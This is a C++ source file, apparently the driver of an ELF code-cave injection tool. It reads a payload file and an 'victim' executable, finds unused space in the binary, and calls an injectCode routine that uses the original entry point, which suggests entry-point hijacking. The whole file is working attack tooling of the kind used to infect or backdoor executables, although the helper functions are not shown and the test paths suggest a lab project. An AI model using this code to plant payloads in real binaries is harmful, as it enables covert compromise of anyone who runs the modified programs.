#include <iostream>
#include "utils/utils.h"


int main(int argc, char **argv) {

    std::ifstream input(argc > 2 ? argv[2] : "../../test/payload", std::ios::binary);

    std::vector<unsigned char> payload(std::istreambuf_iterator<char>(input), {});

    std::vector<std::pair<int, int>> sectionMap;

    int fd = open(argc > 1 ? argv[1] : "../../test/victim", O_RDWR);
    std::cout << "INJECTING " << (argc == 3 ? argv[1] : "../../test/victim") << std::endl;

    Elf64_Ehdr ehdr;
    read(fd, &ehdr, sizeof(ehdr));
    auto entryPoint = ehdr.e_entry;
    std::cout << "Old entry point: " << std::hex << ehdr.e_entry << std::endl;

    fillSectionMap(fd, sectionMap);
    // get code cave
//    code_cave_t cc = findCodeCave(fd, sectionMap, payload.size());
    code_cave_t cc = findCodeCave2(fd, payload.size() + 16);
    std::cout << "Code cave start: " << cc.start << " Code cave end: " << cc.end << std::endl;

    // get image base
    int imgBase = getImageBase(fd, ehdr);
    cc.start += imgBase;
    cc.end += imgBase;

    std::cout << std::dec << "Image base: " << imgBase << std::endl;

    // find section of the code cave
//    int secNum = findSectionNum(fd, cc.start, cc.end);
//    std::cout << "Section number of the Code cave: " << secNum << std::endl;

    // TODO: find needed segment and make it executable; edit: impossible. Solution: check if section is executable
//    setExecFlag(fd, secNum);
//    makeSegExec(fd, cc);
//    makeAllExec(fd);
    // inject code
    if (cc.size > payload.size())
        injectCode(fd, cc, entryPoint, ehdr, imgBase, payload);
    std::cout << (argc == 3 ? argv[1] : "../../test/victim") <<
              " INJECTION COMPLETED: " << (payload.size() < cc.size ? "success" : "not enough space") << std::endl;
    close(fd);

    return 0;
}
